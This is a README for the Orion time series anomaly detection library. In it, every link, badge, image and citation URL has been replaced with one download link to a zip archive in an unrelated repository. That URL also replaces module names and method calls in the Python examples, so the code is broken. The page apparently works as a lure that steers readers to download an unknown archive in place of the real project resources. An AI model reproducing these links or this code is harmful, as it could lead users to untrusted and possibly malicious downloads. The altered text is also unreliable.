<p align="left">
<img width=15% src="https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip" alt=“DAI-Lab” />
<i>An open source project from Data to AI Lab at MIT.</i>
</p>

<p align="left">
<img width=20% src="https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip" alt=“Orion” />
</p>

[![Development Status](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip%20Status-2%20--%20Pre--Alpha-yellow)](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip+Status+%3A%3A+2+-+Pre-Alpha)
[![Python](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip%20%7C%203.9%20%7C%203.10%20%7C%203.11-blue)](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip) 
[![PyPi Shield](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip)](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip)
[![Tests](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip%https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip)](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip%3A%22Run+Tests%22+branch%3Amaster)
[![Downloads](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip)](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip)
[![Binder](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip)](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip)

# Orion

A machine learning library for unsupervised time series anomaly detection.

| Important Links                               |                                                                      |
| --------------------------------------------- | -------------------------------------------------------------------- |
| :computer: **[Website]**                      | Check out the Sintel Website for more information about the project. |
| :book: **[Documentation]**                    | Quickstarts, User and Development Guides, and API Reference.         |
| :star: **[Tutorials]**                        | Checkout our notebooks                                               |
| :octocat: **[Repository]**                    | The link to the Github Repository of this library.                   |
| :scroll: **[License]**                        | The repository is published under the MIT License.                   |
| [![][Slack Logo] **Community**][Community]    | Join our Slack Workspace for announcements and discussions.          |

[Website]: https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip
[Documentation]: https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip
[Tutorials]: https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip
[Repository]: https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip
[License]: https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip
[Community]: https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip
[Slack Logo]: https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip

# Overview

Orion is a machine learning library built for *unsupervised time series anomaly detection*. With a given time series data, we provide a number of “verified” ML pipelines (a.k.a Orion pipelines) that identify rare patterns and flag them for expert review.

The library makes use of a number of **automated machine learning** tools developed under [Data to AI Lab at MIT](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip).

Read about using an Orion pipeline on NYC taxi dataset in a blog series:

[Part 1: Learn about unsupervised time series anomaly detection](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip) | [Part 2: Learn how we use GANs to solving the problem? ](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip) | [Part 3: How does one evaluate anomaly detection pipelines?](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip)
:--------------------------------------:|:---------------------------------------------:|:--------------------------------------------:
![](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip)       |  ![](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip)            | ![](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip)

**Notebooks:** Discover *Orion* through colab by launching our [notebooks](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip)!

# Quickstart

## Install with pip

The easiest and recommended way to install **Orion** is using [pip](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip):

```bash
pip install orion-ml
```

This will pull and install the latest stable release from [PyPi](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip).


In the following example we show how to use one of the **Orion Pipelines**.

## Fit an Orion pipeline

We will load a demo data for this example:

```python3
from https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip import load_signal

train_data = load_signal('S-1-train')
https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip()
```

which should show a signal with `timestamp` and `value`.
```
    timestamp     value
0  1222819200 -0.366359
1  1222840800 -0.394108
2  1222862400  0.403625
3  1222884000 -0.362759
4  1222905600 -0.370746
```

In this example we use `aer` pipeline and set some hyperparameters (in this case training epochs as 5).

```python3
from orion import Orion

hyperparameters = {
    'https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip': {
        'epochs': 5,
        'verbose': True
    }
}

orion = Orion(
    pipeline='aer',
    hyperparameters=hyperparameters
)

https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip(train_data)
```

## Detect anomalies using the fitted pipeline
Once it is fitted, we are ready to use it to detect anomalies in our incoming time series:

```python3
new_data = load_signal('S-1-new')
anomalies = https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip(new_data)
```
> :warning: Depending on your system and the exact versions that you might have installed some *WARNINGS* may be printed. These can be safely ignored as they do not interfere with the proper behavior of the pipeline.

The output of the previous command will be a ``https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip`` containing a table of detected anomalies:

```
        start         end  severity
0  1402012800  1403870400  0.122539
```

# Leaderboard
In every release, we run Orion benchmark. We maintain an up-to-date leaderboard with the current scoring of the verified pipelines according to the benchmarking procedure.

We run the benchmark on **12** datasets with their known grounth truth. We record the score of the pipelines on each datasets. To compute the leaderboard table, we showcase the number of wins each pipeline has over the ARIMA pipeline.

| Pipeline                  |  Outperforms ARIMA |
|---------------------------|--------------------|
| AER                       |         11         |
| TadGAN                    |          7         |
| LSTM Dynamic Thresholding |          9         |
| LSTM Autoencoder          |          6         |
| Dense Autoencoder         |          8         |
| VAE                       |          6         |
| AnomalyTransformer        |          2         |
| LNN                       |          7         |
| Matrix Profile            |          5         |
| UniTS                     |          6         |
| [GANF](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip)                                                  |          5         |
| [Azure](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip)      |          0         |


You can find the scores of each pipeline on every signal recorded in the [details Google Sheets document](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip). The summarized results can also be browsed in the following [summary Google Sheets document](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip).

# Resources

Additional resources that might be of interest:
* Learn about [benchmarking pipelines](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip).
* Read about [pipeline evaluation](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip).
* Find out more about [TadGAN](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip).

# Citation

If you use **AER** for your research, please consider citing the following paper:

Lawrence Wong, Dongyu Liu, Laure Berti-Equille, Sarah Alnegheimish, Kalyan Veeramachaneni. [AER: Auto-Encoder with Regression for Time Series Anomaly Detection](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip).

```
@inproceedings{wong2022aer,
  title={AER: Auto-Encoder with Regression for Time Series Anomaly Detection},
  author={Wong, Lawrence and Liu, Dongyu and Berti-Equille, Laure and Alnegheimish, Sarah and Veeramachaneni, Kalyan},
  booktitle={2022 IEEE International Conference on Big Data (IEEE BigData)},
  pages={1152-1161},
  doi={10.1109/BigData55660.2022.10020857},
  organization={IEEE},
  year={2022}
}
```

If you use **TadGAN** for your research, please consider citing the following paper:

Alexander Geiger, Dongyu Liu, Sarah Alnegheimish, Alfredo Cuesta-Infante, Kalyan Veeramachaneni. [TadGAN - Time Series Anomaly Detection Using Generative Adversarial Networks](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip).

```
@inproceedings{geiger2020tadgan,
  title={TadGAN: Time Series Anomaly Detection Using Generative Adversarial Networks},
  author={Geiger, Alexander and Liu, Dongyu and Alnegheimish, Sarah and Cuesta-Infante, Alfredo and Veeramachaneni, Kalyan},
  booktitle={2020 IEEE International Conference on Big Data (IEEE BigData)},
  pages={33-43},
  doi={10.1109/BigData50022.2020.9378139},
  organization={IEEE},
  year={2020}
}
```

If you use **Orion** which is part of the **Sintel** ecosystem for your research, please consider citing the following paper:

Sarah Alnegheimish, Dongyu Liu, Carles Sala, Laure Berti-Equille, Kalyan Veeramachaneni. [Sintel: A Machine Learning Framework to Extract Insights from Signals](https://raw.githubusercontent.com/MasterScript-DeltaHub/Orion/master/richesse/Orion.zip).
```
@inproceedings{alnegheimish2022sintel,
  title={Sintel: A Machine Learning Framework to Extract Insights from Signals},
  author={Alnegheimish, Sarah and Liu, Dongyu and Sala, Carles and Berti-Equille, Laure and Veeramachaneni, Kalyan},  
  booktitle={Proceedings of the 2022 International Conference on Management of Data},
  pages={1855–1865},
  numpages={11},
  publisher={Association for Computing Machinery},
  doi={10.1145/3514221.3517910},
  series={SIGMOD '22},
  year={2022}
}
```
